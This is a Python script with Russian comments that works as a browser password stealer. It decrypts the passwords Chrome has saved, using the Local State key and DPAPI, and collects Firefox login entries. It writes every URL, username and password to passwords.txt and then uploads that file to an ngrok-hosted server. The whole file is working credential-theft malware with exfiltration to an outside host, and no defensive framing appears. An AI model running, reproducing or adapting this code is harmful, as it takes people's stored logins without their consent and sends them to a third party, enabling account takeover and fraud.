import os
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
import requests

def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                     "AppData", "Local", "Google",
                                     "Chrome", "User Data", "Local State")

    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.load(f)

    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    encrypted_key = encrypted_key[5:]  # Убираем первые 5 байтов
    decrypted_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

    return decrypted_key

def decrypt_password(password, key):
    try:
        iv = password[3:15]  # первые 3 байта - это префикс "v10"
        password = password[15:]  # удаляем префикс
        cipher = AES.new(key, AES.MODE_GCM, iv)
        decrypted_password = cipher.decrypt(password)[:-16].decode()  # удаляем 16 байт тегов GCM
        return decrypted_password
    except Exception as e:
        print(f"Ошибка при расшифровке пароля: {e}")
        return ""

def get_chrome_passwords():
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google",
                           "Chrome", "User Data", "Default", "Login Data")

    shutil.copyfile(db_path, "LoginData.db")
    conn = sqlite3.connect("LoginData.db")
    cursor = conn.cursor()
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

    encryption_key = get_encryption_key()

    password_list = []
    for origin_url, username, password in cursor.fetchall():
        if username and password:
            decrypted_password = decrypt_password(password, encryption_key)
            password_list.append({
                "url": origin_url,
                "username": username,
                "password": decrypted_password
            })

    cursor.close()
    conn.close()
    os.remove("LoginData.db")

    return password_list

def get_firefox_passwords():
    profile_path = os.path.join(os.environ["APPDATA"], "Mozilla", "Firefox", "Profiles")
    profile_dirs = [d for d in os.listdir(profile_path) if d.endswith('.default-release') or d.endswith('.default')]

    password_list = []

    for profile in profile_dirs:
        db_path = os.path.join(profile_path, profile, "logins.json")
        if os.path.exists(db_path):
            with open(db_path, "r", encoding="utf-8") as f:
                logins = json.load(f)

            for login in logins['logins']:
                password = login['password']  # В Firefox пароли хранятся в зашифрованном виде
                # Здесь добавьте расшифровку, если это необходимо
                password_list.append({
                    "url": login['hostname'],
                    "username": login['username'],
                    "password": password  # Возможно, вам нужно расшифровать пароль
                })

    return password_list

def get_all_passwords():
    all_passwords = []
    all_passwords.extend(get_chrome_passwords())
    all_passwords.extend(get_firefox_passwords())
    # Добавьте вызовы для других браузеров по аналогии
    return all_passwords

def load_passwords():
    passwords = get_all_passwords()
    if passwords:
        output = ""
        for entry in passwords:
            output += f"URL: {entry['url']}\nUsername: {entry['username']}\nPassword: {entry['password']}\n"
            output += "=" * 50 + "\n"
        return output
    else:
        return "Пароли не найдены."

def save_passwords(file_name="passwords.txt"):
    with open(file_name, "w", encoding="utf-8") as f:  # Используем "w" для создания или перезаписи файла
        f.write(load_passwords())
        print ("Успешно сохранено!")
    upload_file(file_name)

def upload_file(file_path):
    server_url = 'https://8968-5-173-218-24.ngrok-free.app'  # Ensure this is the correct URL
    with open(file_path, 'rb') as f:
        files = {'file': f}
        response = requests.post(f"{server_url}/upload", files=files)  # Changed to /upload

        if response.status_code == 201:
            print("Файл успешно загружен.")
            print(response.json())  # Print response data for debugging
        else:
            print(f"Не удалось загрузить файл. Код состояния: {response.status_code}, Ответ: {response.text}")

if __name__ == "__main__":
    save_passwords()  # Теперь вызываем save_passwords без аргументов
